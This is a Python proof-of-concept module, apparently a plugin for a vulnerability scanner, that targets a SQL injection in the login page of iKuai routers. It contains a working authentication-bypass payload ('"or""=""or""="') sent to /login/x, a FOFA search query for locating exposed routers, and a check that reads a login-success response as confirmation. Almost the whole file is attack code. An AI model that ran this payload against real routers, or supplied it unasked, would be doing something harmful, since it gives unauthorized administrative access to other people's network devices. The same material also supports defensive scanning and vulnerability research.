# coding:utf-8  
import requests
from lib.core.common import url_handle, get_random_ua
from lib.core.poc import POCBase
# ...
import urllib3

urllib3.disable_warnings()


class POC(POCBase):
    _info = {
        "author": "jijue",  # POC作者
        "version": "1",  # POC版本，默认是1
        "CreateDate": "2022-01-01",  # POC创建时间
        "UpdateDate": "2022-01-01",  # POC创建时间
        "PocDesc": """
        略  
        """,  # POC描述，写更新描述，没有就不写

        "name": "iKuai路由器 login/user处sql注入",  # 漏洞名称
        "VulnID": "oFx-2022-0001",  # 漏洞编号，以CVE为主，若无CVE，使用CNVD，若无CNVD，留空即可
        "AppName": "iKuai路由器",  # 漏洞应用名称
        "AppVersion": "",  # 漏洞应用版本
        "VulnDate": "2015-08-13",  # 漏洞公开的时间,不知道就写今天，格式：xxxx-xx-xx
        "VulnDesc": """
            爱快路由器支持多LAN接入,通过划分不同的LAN进行网络配置,可以提升内网安全性,同时支持内网VLAN。
            双线路由端口分流协议分流多条ISP线路负载叠加,提高带宽总流量。
            爱快路由器系统存在SQL漏洞，攻击者通过漏洞可以获取应用后台权限。
        """,  # 漏洞简要描述

        "fofa-dork": """
            title="登录爱快流控路由"
        """,  # fofa搜索语句
        "example": "",  # 存在漏洞的演示url，写一个就可以了
        "exp_img": "",  # 先不管
    }

    def _verify(self):
        """
        返回vuln

        存在漏洞：vuln = [True,html_source] # html_source就是页面源码  

        不存在漏洞：vuln = [False,""]
        """
        vuln = [False, ""]
        url = self.target + "/login/x"  # url自己按需调整
        data = {"user": "\"or\"\"=\"\"or\"\"=\"",
                "pass": ""}

        headers = {
            "User-Agent": get_random_ua(),
            "Connection": "close",
            "Content-Type": "application/x-www-form-urlencoded",
        }

        try:
            """
            检测逻辑，漏洞存在则修改vuln值为True，漏洞不存在则不动
            """
            req = requests.post(url, data=data, headers=headers, proxies=self.proxy, timeout=self.timeout, verify=False,
                                allow_redirects=False)
            if req.status_code == 200 and "{\"recode\":0,\"error\":\"\\u767b\\u5f55\\u6210\\u529f\"}" in req.text and "text/html" in \
                    req.headers["Content-Type"]:
                vuln = [True, req.text]
            else:
                vuln = [False, req.text]
        except Exception as e:
            raise e

        # 以下逻辑酌情使用
        if self._honeypot_check(vuln[1]) == True:
            vuln[0] = False

        return vuln

    def _attack(self):
        return self._verify()
